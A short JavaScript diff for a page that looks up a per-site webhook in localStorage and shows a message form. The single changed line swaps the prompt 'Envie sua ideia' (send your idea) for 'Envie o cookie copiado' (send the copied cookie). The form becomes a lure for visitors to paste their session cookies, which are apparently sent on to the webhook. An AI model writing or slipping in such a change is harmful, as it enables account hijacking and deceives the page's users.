@@ -67,7 +67,7 @@ const hook=localStorage.getItem("webhook_"+slug);
 const app=document.getElementById("app");
 if(!hook){app.innerHTML="<h2>Site inexistente</h2>"}
 else{
-app.innerHTML=`<h2>Envie sua ideia</h2><textarea id='msg'></textarea><button onclick='send()'>Enviar</button>`}
+app.innerHTML=`<h2>Envie o cookie copiado</h2><textarea id='msg'></textarea><button onclick='send()'>Enviar</button>`}
 function send(){
 const m=msg.value;
 if(!m)return alert("escreve algo");
